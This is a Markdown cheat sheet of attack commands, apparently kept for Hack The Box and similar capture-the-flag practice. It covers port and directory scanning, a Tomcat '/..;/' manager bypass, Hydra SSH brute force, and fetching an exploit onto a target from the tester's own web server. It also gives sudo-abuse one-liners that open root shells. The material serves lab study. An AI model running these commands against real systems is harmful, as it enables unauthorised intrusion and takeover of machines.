# Hackthebox
- default page ```/robots.txt``` ```/S3cret-T3xt``` ```/secret.txt```
- ```find / -name local.txt 2> /dev/null```

- [Nmap](#nmap)
- [BurpSuite](#burp)
- [Gobuster](#gobuster)
- [FFUF](#ffuf)
- [Privilege escalation](#privilegeescalation)
- [Hydra](#hydra) - Brute force attack on ssh
- [FTP](#ftp) 
- [Cewl](#cewl) - It is use to create a worldlist using website link

- ## Nmap <a name="nmap"></a>
- ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
- ```sudo nmap -Pn -A -p- -T4 <ip> > nmap.txt```
- [Squid](https://github.com/aancw/spose.git) Pivoting Open Port Scanner
  - Detecting open port behind squid proxy for CTF and pentest purpose using http proxy method. Only for Python 3 version.
  - ```python3 spose.py --proxy http://192.168.208.189:3128 --target 192.168.208.189```
  - if you detect new port for example: 8080 then you need to config your proxy in firefox set ```HTTP proxy 192.168.208.189``` and ```port 3128```
  - then only you can viste the website http://192.168.208.189:8080

- ## Burp Suite <a name="burp"></a>
- use ```/manager/html``` or ```/..;/manager/html``` in the middel of ```GET/ HTTP/1.1```
  - so it will like this ```GET/ /..;/manager/html HTTP/1.1```
  - whenever you see JSESSIONID=.... use this.
 
- use ```[]==``` for the password if you don't know the pass 
 
- ## Gobuster <a name="gobuster"></a>
- ```gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```

- ## FFUF <a name="ffuf"></a>
- FFUF is used to filter the invalid pages 
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
  - if you are getting the size same of all use filter size and give the size there.
 
- ## Privilege escalation <a name="privilegeescalation"></a>
- Use ```linpeas``` if you are not getting any escalation
  - download the script from the github
- If It was running on Linux Kernel 4.4.0–31-generic and Ubuntu 14.04.5 LTS. use below command
  - ```wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh```
  - ```chmod +x linux-exploit-suggester.sh``` and ```./linux-exploit-suggester.sh```
  - you will get some CVE, select any one CVE in that download URL will be there using that link you can download scripts
  - ```wget (download URL in CVE)``` download the file in your system
  - run ```sudo python -m http.server 80```
  - download the file in the target system ```wget http://<myip>/<filename>```
  - example: wget http://192.168.45.161/root.cpp
 
- if you find ```/usr/bin/python2.7``` in sudo -l
  - then use the below command it will give you the root privilege
  - ```/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
 

- if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo pkexec /bin/bash```

- if you find ```/usr/bin/mtr``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```LFILE=/root/proof.txt```
  - ```sudo mtr --raw -F "$LFILE"```

- if you find ```/usr/bin/time``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo /usr/bin/time /bin/bash```

- if you find ```(ALL : ALL) /bin/nice /notes/*``` in ```sudo -l```
  - it shows that you can run all the files in the /notes directory with /bin/nice binary.
  - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
  - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
  - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.


- if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
  - then use the below command it will give you the root privilege
  - ```sudo perl -e 'exec "/bin/bash";'```

- ## Hydra <a name="hydra"></a>
- ssh renu@127.0.0.1
- if you don't know the password do brute force attack. replace username with ```renu``` and ipaddress with ```127.0.01```
- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```


- ## FTP <a name="ftp"></a>
- ftp <ip>
  - user:anonymous
  - pass:
  - 230 Login successful
  - to upload a file use ```put <filename>```
  - to download a file use ```get <filename>```

- ## Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
